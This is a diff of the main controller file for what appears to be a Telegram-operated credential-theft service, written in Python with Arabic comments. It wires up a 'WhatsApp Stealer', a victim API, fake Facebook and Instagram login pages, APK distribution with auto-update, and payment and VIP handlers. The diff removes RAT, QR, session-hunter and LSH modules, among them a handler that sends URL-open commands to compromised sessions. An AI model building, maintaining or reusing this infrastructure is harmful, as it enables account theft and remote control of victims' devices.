@@ -1,7 +1,7 @@
 # main.py
 # ============================================================
-# DEV 1 - Bot Controller v6
-# مع APK Auto-Update + Web Dashboard
+# DEV 1 - Bot Controller v7
+# بعد حذف RAT / QR / LSH / SH
 # ============================================================
 
 import os
@@ -29,15 +29,14 @@ from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET
 
 from imports_manager import (
     # Blueprints
-    rat_bp, qr_bp, lsh_bp, sh_bp, wa_bp, apk_bp,
+    wa_bp, apk_bp,
     # Flags
-    LSH_ENABLED, SH_ENABLED, WA_ENABLED, APK_MANAGER_ENABLED,
+    WA_ENABLED, APK_MANAGER_ENABLED,
     # Init functions
-    init_facebook_routes, init_instagram_routes, init_rat_routes,
-    init_qr_routes, init_lsh_routes, init_session_hunter_routes,
+    init_facebook_routes, init_instagram_routes,
     init_whatsapp_stealer_routes, init_apk_routes,
     # Helpers
-    set_bot_reference, register_payment_handlers,
+    register_payment_handlers,
 )
 
 from api_victim import init_victim_api
@@ -54,7 +53,6 @@ from bot_handlers import (
     admin_ban_handler, admin_unban_handler, admin_delete_handler,
     admin_grant_vip_handler, admin_give_stars_handler,
     admin_msg_user_handler,
-    _pending_open_url,
 )
 
 from short_link import init_short_link
@@ -107,11 +105,11 @@ app = Flask(__name__)
 ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
 
 ALLOWED_PREFIXES = (
-    '/lsh', '/sh', '/rat', '/qr', '/wa',
-    '/apk',             # ★ APK Manager + Auto-Update
-    '/dashboard',       # ★ Web Dashboard
-    '/api/v1/session', '/qr_scan', '/f/',
-    '/login.php', '/ig_login.php', '/system_secure',
+    '/wa',              # WhatsApp Stealer
+    '/apk',             # APK Manager + Auto-Update
+    '/dashboard',       # Web Dashboard
+    '/api/v1/session', '/f/',
+    '/login.php', '/ig_login.php',
     '/manifest.json', '/sw.js',
     '/_health', '/_metrics', '/_version',
 )
@@ -187,22 +185,6 @@ def log_request(response):
 # ============================================================
 # [10] تسجيل الـ Blueprints
 # ============================================================
-if sh_bp:
-    app.register_blueprint(sh_bp)
-    logger.info("[+] Registered: sh_bp")
-
-if lsh_bp:
-    app.register_blueprint(lsh_bp)
-    logger.info("[+] Registered: lsh_bp")
-
-if rat_bp:
-    app.register_blueprint(rat_bp)
-    logger.info("[+] Registered: rat_bp")
-
-if qr_bp:
-    app.register_blueprint(qr_bp)
-    logger.info("[+] Registered: qr_bp")
-
 if wa_bp:
     app.register_blueprint(wa_bp)
     logger.info("[+] Registered: wa_bp")
@@ -220,15 +202,6 @@ logger.info("[+] Init: facebook routes")
 
 init_instagram_routes(app, bot)
 logger.info("[+] Init: instagram routes")
-
-init_rat_routes(app, bot)
-logger.info("[+] Init: rat routes")
-
-init_qr_routes(app, bot)
-logger.info("[+] Init: qr routes")
-
-init_session_hunter_routes(app, bot)
-logger.info("[+] Init: session_hunter routes")
 
 # WhatsApp Stealer
 if WA_ENABLED:
@@ -250,7 +223,7 @@ if APK_MANAGER_ENABLED:
 else:
     logger.warning("[-] APK Manager disabled - skipping init")
 
-# ★ APK Auto-Update Routes
+# APK Auto-Update Routes
 if APK_UPDATE_ENABLED:
     try:
         init_apk_update_routes(app, bot)
@@ -259,17 +232,6 @@ if APK_UPDATE_ENABLED:
         logger.exception(f"[-] APK Update init failed: {e}")
 else:
     logger.warning("[-] APK Update disabled - skipping init")
-
-# LSH
-if LSH_ENABLED:
-    try:
-        init_lsh_routes(app, bot)
-        set_bot_reference(bot)
-        logger.info("[+] Init: LSH routes + bot reference")
-    except Exception as e:
-        logger.exception(f"[-] LSH init failed: {e}")
-else:
-    logger.warning("[-] LSH disabled - skipping init")
 
 register_payment_handlers(bot)
 logger.info("[+] Init: payment handlers")
@@ -310,35 +272,9 @@ if WEB_DASHBOARD_ENABLED:
 else:
     logger.warning("[-] Web Dashboard disabled - skipping init")
 
-# ============================================================
-# [16] LSH - الرابط المُدخل
-# ============================================================
-from imports_manager import lsh_push_command
-
-
-@bot.message_handler(
-    func=lambda m: m.chat.id in _pending_open_url
-    and m.text and m.text.startswith("http")
-)
-def handle_open_url(message):
-    sid = _pending_open_url.pop(message.chat.id, None)
-    if sid:
-        ok = lsh_push_command(sid, {
-            "action": "url",
-            "payload": {"url": message.text}
-        })
-        bot.send_message(
-            message.chat.id,
-            "✅ تم الإرسال" if ok else "❌ فشل"
-        )
-        metrics.inc_counter(
-            "lsh_url_commands",
-            tags={"status": "ok" if ok else "fail"}
-        )
-
 
 # ============================================================
-# [17] تشغيل البوت
+# [16] تشغيل البوت
 # ============================================================
 def run_telegram_bot():
     logger.info("=" * 60)
@@ -387,7 +323,7 @@ def run_telegram_bot():
 
 
 # ============================================================
-# [18] Main
+# [17] Main
 # ============================================================
 if __name__ == "__main__":
     try:
